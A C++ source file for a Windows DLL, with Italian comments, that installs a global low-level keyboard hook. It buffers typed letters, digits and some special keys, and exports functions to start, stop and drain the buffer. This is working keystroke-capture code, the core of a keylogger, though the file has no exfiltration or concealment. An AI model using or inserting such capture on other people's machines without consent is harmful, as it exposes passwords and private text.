#define KEYHOOK_EXPORTS
#include "keyhook.h"
#include <windows.h>
#include <string>
#include <mutex>

HHOOK hHook = NULL;
std::string keyBuffer;
std::mutex bufferMutex;

// Low-level keyboard hook procedure
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = pKb->vkCode;

            char key = 0;

            // Converti vkCode in char ASCII (semplice mappa per lettere e numeri)
            if (vkCode >= 'A' && vkCode <= 'Z') {
                key = (char)vkCode;
            }
            else if (vkCode >= '0' && vkCode <= '9') {
                key = (char)vkCode;
            }
            else {
                // Mapping di caratteri speciali
                switch (vkCode) {
                case VK_SPACE: key = ' '; break;
                case VK_RETURN: key = '\n'; break;
                case VK_BACK: key = '\b'; break;
                case VK_TAB: key = '\t'; break;
                case VK_ESCAPE: key = 27; break;
                case VK_DELETE: key = 127; break;
                default:
                    // Ignora altri tasti per semplicità
                    key = 0;
                    break;
                }
            }

            if (key != 0) {
                std::lock_guard<std::mutex> lock(bufferMutex);
                keyBuffer += key;
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Start hook
extern "C" KEYHOOK_API bool StartKeyHook() {
    if (hHook == NULL) {
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
        return (hHook != NULL);
    }
    return false;
}

// Stop hook
extern "C" KEYHOOK_API void StopKeyHook() {
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

// Return buffer content and clear it
extern "C" KEYHOOK_API const char* GetKeyBuffer() {
    static std::string bufferCopy;
    std::lock_guard<std::mutex> lock(bufferMutex);
    bufferCopy = keyBuffer;
    keyBuffer.clear();
    return bufferCopy.c_str();
}
